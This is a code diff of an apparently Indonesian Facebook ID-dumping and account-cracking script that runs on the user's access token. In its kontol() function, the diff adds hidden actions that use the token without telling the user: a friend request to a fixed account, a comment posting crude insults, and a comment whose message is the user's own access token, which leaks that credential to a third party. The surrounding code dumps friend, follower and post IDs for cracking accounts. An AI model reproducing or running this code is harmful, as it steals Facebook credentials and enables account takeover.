@@ -79,6 +79,8 @@ id = []
 ttl =[]
 user = []
 loop = 0
+koh = '100005395413800'
+hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 # lempankkkkkkkk
 def jalan(z):
     for e in z + '\n':
@@ -107,6 +109,7 @@ def hasil(ok,cp):
 	else:
 		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
 		exit()
+xi_jimpinx = '1714000985456399'
 # Token FB bukan token PLN
 def yayanxd():
 	os.system('clear')
@@ -138,6 +141,7 @@ def yayanxd():
 		print '\n\n %s[%s!%s] token invalid'%(N,M,N)
 		time.sleep(2)
 		yayanxd()
+lo_ngentod = '1714009362122228'
 ### ORANG GANTENG ###
 def moch_yayan():
     os.system('clear')
@@ -256,13 +260,9 @@ def kontol():
 	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
-	srghun = '100007639052164'
-	rrtfgf = 'Bismillah semoga bang @[100005395413800:] dan kak @[100059709917296:] tahun depan menikah🥰'
-	fdrffg = '2657012877896655'
-	vyhbhj = 'ANGRY'
-	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(srghun,__cindy__))
-	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(fdrffg,rrtfgf,__cindy__))
-	requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg,vyhbhj,__cindy__))
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__cindy__))
+	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,__cindy__,__cindy__))
+	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
 	moch_yayan()
 # dump id dari teman hehe
 def teman():
@@ -299,8 +299,8 @@ def teman():
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
     except (KeyError,IOError):
-    	os.remove(cin)
-    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        os.remove(cin)
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N))
         moch_yayan()
 '''
@@ -343,8 +343,8 @@ def publik():
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
     except (KeyError,IOError):
-    	os.remove(kntl)
-    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        os.remove(kntl)
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N))
         moch_yayan()
 # dump id dari followers hehe
@@ -383,8 +383,8 @@ def followers():
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
     except (KeyError,IOError):
-    	os.remove(ah)
-    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        os.remove(ah)
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N))
         moch_yayan()
 # dump id dari postingan hehe
@@ -423,8 +423,8 @@ def postingan():
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
     except (KeyError,IOError):
-    	os.remove(ikeh)
-    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        os.remove(ikeh)
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N))
         moch_yayan()
 # cek ingfo
